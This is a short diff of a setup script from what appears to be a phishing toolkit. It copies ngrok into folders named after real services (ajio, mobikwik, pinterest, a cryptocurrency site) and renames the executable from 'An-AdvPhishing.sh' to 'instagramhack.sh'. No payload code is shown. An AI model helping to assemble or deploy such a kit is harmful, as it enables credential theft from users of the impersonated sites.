@@ -55,7 +55,7 @@ cp -R ngrok sites/ajio/
 cp -R ngrok sites/cryptocurrency/
 cp -R ngrok sites/mobikwik/
 cp -R ngrok sites/pinterest/
-chmod 7777 An-AdvPhishing.sh
+chmod 7777 instagramhack.sh
 clear
 echo ""
 echo ""
